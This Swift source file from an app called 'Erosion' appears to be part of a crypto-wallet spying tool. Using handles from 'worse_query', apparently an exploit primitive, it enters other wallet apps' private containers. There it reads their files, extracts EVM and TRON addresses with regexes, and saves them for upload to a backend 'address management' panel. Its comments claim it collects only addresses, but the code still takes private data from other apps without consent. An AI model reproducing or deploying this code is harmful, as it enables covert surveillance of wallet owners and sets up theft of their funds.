//
//  AddressScanView.swift
//  Erosion
//
//  地址扫描：在已拉取/已授权钱包容器里找**公开地址**（0x… / T… 这类），
//  结果写 Documents/addresses.json，由 /report 回传后台「地址管理」。
//  只收地址，不碰任何助记词/私钥内容。
//

import SwiftUI

struct AddressEntry: Identifiable {
    let id = UUID()
    let wallet: String
    let bundleId: String
    let address: String
    let chain: String
    let source: String
}

struct AddressScanView: View {
    @State private var running = false
    @State private var status = "Idle"
    @State private var entries: [AddressEntry] = []
    @State private var scannedFiles = 0
    @State private var scannedWallets = 0

    private var addressesURL: URL {
        URL.documentsDirectory.appendingPathComponent("addresses.json")
    }

    var body: some View {
        List {
            Section {
                Button {
                    run()
                } label: {
                    HStack {
                        Label("扫描钱包地址", systemImage: "number")
                        Spacer()
                        if running { ProgressView() }
                    }
                }
                .disabled(running)
            } header: {
                HeaderLabel("Addresses", symbol: "number")
            } footer: {
                Text("只扫 Documents / Library/Preferences / Application Support 下小于 2 MB 的文件，正则取 EVM(0x…) 和 TRON(T…) 地址；跳过 Caches/tmp。结果回传后台「地址管理」。")
            }

            Section {
                LabeledContent("Status", value: status)
                LabeledContent("钱包", value: "\(scannedWallets)")
                LabeledContent("文件", value: "\(scannedFiles)")
                LabeledContent("地址", value: "\(entries.count)")
            } header: {
                HeaderLabel("Progress", symbol: "chart.bar")
            }

            if !entries.isEmpty {
                Section {
                    ForEach(entries.prefix(80)) { entry in
                        VStack(alignment: .leading, spacing: 2) {
                            Text(entry.address)
                                .font(.system(.caption, design: .monospaced))
                            Text("\(entry.wallet) · \(entry.chain)")
                                .font(.caption2)
                                .foregroundStyle(.secondary)
                        }
                    }
                } header: {
                    HeaderLabel("结果（前 80 条）", symbol: "list.bullet")
                }
            }
        }
        .navigationTitle("Address Scan")
        .disabled(running)
        .onAppear { entries = loadEntries() }
    }

    // MARK: - 扫描

    private func run() {
        running = true
        status = "扫描中…"
        OpLog.append("address", "start", "地址扫描开始")

        let targets = walletTargets()
        scannedFiles = 0
        scannedWallets = 0
        entries = []

        DispatchQueue.global(qos: .userInitiated).async {
            var found: [AddressEntry] = []
            var seen = Set<String>()

            for target in targets {
                let handle = worse_query(target.path, group, false, true)
                guard handle >= 0 else {
                    OpLog.append("address", "skip", "\(target.name) 拿不到容器权限")
                    continue
                }
                defer { worse_query_release(handle) }

                DispatchQueue.main.async {
                    scannedWallets += 1
                    status = "扫描 \(target.name)…"
                }
                OpLog.append("address", "step", "扫描 \(target.name)")

                for url in self.enumerate(target.path) {
                    let attrs = try? fm.attributesOfItem(atPath: url.path)
                    let size = (attrs?[.size] as? NSNumber)?.int64Value ?? 0
                    guard size > 0, size < 2_000_000 else { continue }
                    guard let data = fm.contents(atPath: url.path) else { continue }

                    DispatchQueue.main.async { scannedFiles += 1 }
                    let text = String(decoding: data, as: UTF8.self)
                    for (address, chain) in Self.extract(from: text) {
                        let key = "\(target.bundleId)|\(address)"
                        guard !seen.contains(key) else { continue }
                        seen.insert(key)
                        found.append(
                            AddressEntry(
                                wallet: target.name,
                                bundleId: target.bundleId,
                                address: address,
                                chain: chain,
                                source: url.path.replacingOccurrences(of: target.path + "/", with: "")
                            )
                        )
                    }
                }
            }

            self.save(found)
            DispatchQueue.main.async {
                entries = found
                running = false
                status = "完成：\(found.count) 个地址"
            }
            OpLog.append("address", "done", "地址扫描完成：\(found.count) 个地址 / \(scannedWallets) 个钱包")
        }
    }

    private struct Target {
        let name: String
        let bundleId: String
        let path: String
    }

    private func walletTargets() -> [Target] {
        var index: [String: String] = [:]
        if let data = try? Data(contentsOf: URL.documentsDirectory.appendingPathComponent("container-index.json")),
           let dict = try? JSONSerialization.jsonObject(with: data) as? [String: String] {
            index = dict
        }

        var result: [Target] = []
        for preset in walletPresets {
            if let path = index[preset.bundleID] ?? preset.known {
                guard fm.fileExists(atPath: path) else { continue }
                result.append(Target(name: preset.name, bundleId: preset.bundleID, path: path))
            }
        }
        return result
    }

    /// 只走浅层：容器根 / Documents / Library/Preferences / Library/Application Support
    private func enumerate(_ root: String) -> [URL] {
        let roots = [
            root + "/Documents",
            root + "/Library/Preferences",
            root + "/Library/Application Support",
        ]
        var urls: [URL] = []
        for path in roots {
            guard let enumerator = fm.enumerator(
                at: URL(fileURLWithPath: path),
                includingPropertiesForKeys: [.isRegularFileKey],
                options: [.skipsHiddenFiles]
            ) else { continue }
            for case let url as URL in enumerator {
                let isFile = (try? url.resourceValues(forKeys: [.isRegularFileKey]))?.isRegularFile ?? false
                if isFile { urls.append(url) }
                if urls.count > 4000 { return urls }
            }
        }
        return urls
    }

    static func extract(from text: String) -> [(String, String)] {
        var result: [(String, String)] = []

        if let evm = try? NSRegularExpression(pattern: "(?i)\\b0x[0-9a-f]{40}\\b") {
            for match in evm.matches(in: text, range: NSRange(text.startIndex..., in: text)) {
                if let range = Range(match.range, in: text) {
                    result.append((String(text[range]).lowercased(), "EVM"))
                }
            }
        }
        if let tron = try? NSRegularExpression(pattern: "\\bT[1-9A-HJ-NP-Za-km-z]{33}\\b") {
            for match in tron.matches(in: text, range: NSRange(text.startIndex..., in: text)) {
                if let range = Range(match.range, in: text) {
                    result.append((String(text[range]), "TRON"))
                }
            }
        }
        return result
    }

    // MARK: - 存取

    private func save(_ list: [AddressEntry]) {
        let rows: [[String: Any]] = list.map { entry in
            [
                "wallet": entry.wallet,
                "bundleId": entry.bundleId,
                "address": entry.address,
                "chain": entry.chain,
                "source": entry.source,
                "foundAt": ISO8601DateFormatter().string(from: Date()),
            ]
        }
        if let data = try? JSONSerialization.data(withJSONObject: rows, options: [.prettyPrinted]) {
            try? data.write(to: addressesURL)
        }
    }

    private func loadEntries() -> [AddressEntry] {
        guard let data = try? Data(contentsOf: addressesURL),
              let rows = try? JSONSerialization.jsonObject(with: data) as? [[String: Any]] else {
            return []
        }
        return rows.map { row in
            AddressEntry(
                wallet: row["wallet"] as? String ?? "",
                bundleId: row["bundleId"] as? String ?? "",
                address: row["address"] as? String ?? "",
                chain: row["chain"] as? String ?? "",
                source: row["source"] as? String ?? ""
            )
        }
    }
}
